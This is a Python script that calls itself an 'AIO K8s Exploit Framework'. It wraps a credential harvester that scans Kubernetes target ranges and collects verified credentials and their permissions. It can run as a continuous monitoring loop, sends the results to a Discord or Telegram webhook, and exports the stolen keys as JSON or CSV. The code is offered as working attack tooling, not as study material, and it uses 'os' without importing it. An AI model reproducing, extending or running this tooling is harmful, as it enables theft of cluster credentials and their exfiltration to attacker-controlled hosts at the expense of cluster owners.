#!/usr/bin/env python3
"""
Integration module for larger exploitation framework
"""

from k8s_production_harvester import ProductionK8sHarvester, CredentialResult
from k8s_config_production import ProductionConfig
import asyncio
import json
from typing import Dict, List, Any

class AIOK8sExploitFramework:
    """Advanced I/O Kubernetes Exploitation Framework"""
    
    def __init__(self):
        self.config = ProductionConfig()
        self.harvester = ProductionK8sHarvester(
            webhook_url=self.config.get_webhook_url()
        )
        self.session_results = {}
    
    async def run_targeted_harvest(self, custom_targets: List[str] = None) -> Dict[str, Any]:
        """Run harvest with custom or default targets"""
        targets = custom_targets or self.config.get_target_ranges()
        
        # Validate targets for production safety
        safe_targets = [t for t in targets if self.config.is_production_safe(t)]
        
        if not safe_targets:
            raise ValueError("No safe targets provided for production scanning")
        
        return await self.harvester.run_harvest_operation(safe_targets)
    
    async def continuous_monitoring(self, interval_minutes: int = 60):
        """Continuous monitoring mode"""
        while True:
            try:
                results = await self.run_targeted_harvest()
                self.session_results[results['scan_metadata']['session_id']] = results
                
                # Clean up old results (keep last 10)
                if len(self.session_results) > 10:
                    oldest_key = min(self.session_results.keys())
                    del self.session_results[oldest_key]
                
                await asyncio.sleep(interval_minutes * 60)
                
            except Exception as e:
                print(f"Monitoring error: {e}")
                await asyncio.sleep(300)  # Wait 5 minutes on error
    
    def export_session_data(self, session_id: str, format: str = 'json') -> str:
        """Export specific session data"""
        if session_id not in self.session_results:
            raise ValueError(f"Session {session_id} not found")
        
        data = self.session_results[session_id]
        
        if format == 'json':
            return json.dumps(data, indent=2)
        elif format == 'csv':
            # Convert to CSV format
            lines = ["Type,Key,Cluster,Verified,Permissions"]
            for cred_type, creds in data['verified_credentials'].items():
                for cred in creds:
                    lines.append(f"{cred_type},{cred['key']},{cred['cluster']},{True},{';'.join(cred['permissions'])}")
            return '\n'.join(lines)
        else:
            raise ValueError(f"Unsupported format: {format}")

# CLI Interface
async def cli_main():
    """Command-line interface"""
    import argparse
    
    parser = argparse.ArgumentParser(description="AIO K8s Exploit Framework")
    parser.add_argument('--targets', nargs='+', help="Custom target ranges")
    parser.add_argument('--monitor', action='store_true', help="Continuous monitoring mode")
    parser.add_argument('--webhook', help="Discord/Telegram webhook URL")
    parser.add_argument('--output', default='json', choices=['json', 'csv'], help="Output format")
    
    args = parser.parse_args()
    
    if args.webhook:
        os.environ['K8S_HARVEST_WEBHOOK_URL'] = args.webhook
    
    framework = AIOK8sExploitFramework()
    
    if args.monitor:
        print("ðŸ”„ Starting continuous monitoring mode...")
        await framework.continuous_monitoring()
    else:
        print("ðŸš€ Starting one-time harvest...")
        results = await framework.run_targeted_harvest(args.targets)
        
        if args.output == 'csv':
            output = framework.export_session_data(results['scan_metadata']['session_id'], 'csv')
            print(output)
        else:
            print(json.dumps(results, indent=2))

if __name__ == "__main__":
    asyncio.run(cli_main())